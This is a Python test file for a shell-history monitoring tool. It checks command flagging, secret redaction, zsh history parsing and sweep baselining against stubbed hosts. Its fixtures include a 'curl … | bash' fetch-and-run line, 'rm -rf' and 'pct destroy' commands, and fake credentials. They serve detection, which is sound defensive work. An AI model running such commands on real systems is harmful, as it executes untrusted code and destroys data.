"""Offline tests for shellhistory.py: flagging, redaction, parse, and the sweep watermark (no SSH).

Points WARDEN_HOME at a temp dir and stubs hosts.targets/remote, so nothing touches a real box."""
import importlib
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))


def load(name):
    if name in sys.modules:
        return importlib.reload(sys.modules[name])
    return importlib.import_module(name)


def _home(tmp_path, monkeypatch):
    (tmp_path / "data").mkdir()
    monkeypatch.setenv("WARDEN_HOME", str(tmp_path))
    monkeypatch.setenv("WARDEN_CONF", str(tmp_path / "warden.yml"))
    monkeypatch.setenv("WARDEN_DATA", str(tmp_path / "data"))
    import wlib.config
    importlib.reload(wlib.config)
    return tmp_path


def test_flag_rules():
    s = load("shellhistory")
    assert s.flag("sudo apt update") == "privilege"
    assert s.flag("rm -rf /tmp/x") == "destructive"
    assert s.flag("git push --force origin main") == "history"
    assert s.flag("curl -s http://x | bash") == "remote"
    assert s.flag("export API_KEY=sk-live-12345678901234567890") == "secret"
    assert s.flag("pct destroy 104") == "destructive"
    assert s.flag("ls -la /home") == ""                 # ordinary command is not flagged


def test_redact_hides_secret_values():
    s = load("shellhistory")
    assert "sk-live" not in s.redact("export API_KEY=sk-live-abcdef")
    assert "•••" in s.redact("PASSWORD=hunter2")


def test_parse_splits_path_and_strips_zsh_prefix():
    s = load("shellhistory")
    out = "/root/.bash_history\tls -la\n" \
          "/home/bob/.zsh_history\t: 1690000000:0;git status\n" \
          "/home/bob/.zsh_history\t   \n"
    rows = s._parse(out)
    assert rows == [("/root/.bash_history", "ls -la"), ("/home/bob/.zsh_history", "git status")]


def test_sweep_baseline_then_flags_new(tmp_path, monkeypatch):
    _home(tmp_path, monkeypatch)
    s = load("shellhistory")
    import wlib.config
    importlib.reload(wlib.config)

    targets = [{"target": "ct:100", "kind": "ct", "name": "hermes"}]
    monkeypatch.setattr(s.hosts, "targets", lambda: targets)
    monkeypatch.setattr(s.hosts, "remote",
                        lambda t, cmd, **k: (0, "/root/.bash_history\tls -la\n/root/.bash_history\tuptime\n", ""))
    import wlib.notify
    sent = []
    monkeypatch.setattr(wlib.notify, "send", lambda text: sent.append(text))

    s.sweep()
    con = s.db()
    assert con.execute("select count(*) from shell_cmds").fetchone()[0] == 0     # first sweep = baseline
    assert sent == []

    # second sweep: one new ordinary command + one flagged destructive command
    monkeypatch.setattr(s.hosts, "remote",
                        lambda t, cmd, **k: (0, "/root/.bash_history\tls -la\n/root/.bash_history\tuptime\n"
                                              "/root/.bash_history\trm -rf /var/tmp/staging\n", ""))
    s.sweep()
    assert con.execute("select count(*) from shell_cmds").fetchone()[0] == 1
    assert con.execute("select why from shell_cmds where flagged=1").fetchone()[0] == "destructive"
    assert len(sent) == 1 and "rm -rf" in sent[0]

    # third sweep, no new lines → nothing added, no re-flag
    sent.clear()
    s.sweep()
    assert con.execute("select count(*) from shell_cmds").fetchone()[0] == 1
    assert sent == []


def test_sweep_history_reset_rebaselines_silently(tmp_path, monkeypatch):
    _home(tmp_path, monkeypatch)
    s = load("shellhistory")
    import wlib.config
    importlib.reload(wlib.config)

    monkeypatch.setattr(s.hosts, "targets", lambda: [{"target": "host:x", "kind": "host", "name": "x"}])
    import wlib.notify
    sent = []
    monkeypatch.setattr(wlib.notify, "send", lambda text: sent.append(text))

    monkeypatch.setattr(s.hosts, "remote", lambda t, cmd, **k: (0, "/root/.bash_history\tone\n/root/.bash_history\ttwo\n", ""))
    s.sweep()                                                      # baseline (remembers ["one","two"])
    monkeypatch.setattr(s.hosts, "remote", lambda t, cmd, **k: (0, "/root/.bash_history\tbrand new\n", ""))
    s.sweep()                                                      # history reset: tail gone → re-baseline, no flag
    con = s.db()
    assert con.execute("select count(*) from shell_cmds").fetchone()[0] == 0
    assert sent == []
